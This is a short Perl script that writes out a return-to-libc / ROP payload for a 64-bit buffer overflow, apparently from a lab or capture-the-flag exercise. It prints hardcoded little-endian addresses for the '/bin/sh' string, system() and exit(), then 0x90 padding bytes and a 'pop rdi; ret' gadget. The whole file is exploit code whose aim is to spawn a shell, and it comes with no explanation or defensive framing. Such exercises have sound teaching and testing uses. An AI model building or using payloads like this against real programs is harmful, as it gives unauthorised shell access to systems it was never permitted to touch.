#!/usr/bin/perl

#0x 7f ff f7 b9 a1 77
# Address of /bin/sh
print "\x77\xa1\xb9\xf7\xff\x7f";

#0x7f ff f7 b9 a3 ea
# Address of System
print "\xea\xa3\xb9\xf7\xff\x7f";

#0x7f ff f7 a1 fc 4d
# Address of exit
print "\x4d\xfc\xa1\xf7\xff\x7f";

print "\x90"x6;

#0x00 00 00 00 00 40 06 e3
# pop rdi; ret;
print "\xe3\x06\x40\x00\x00\x00";
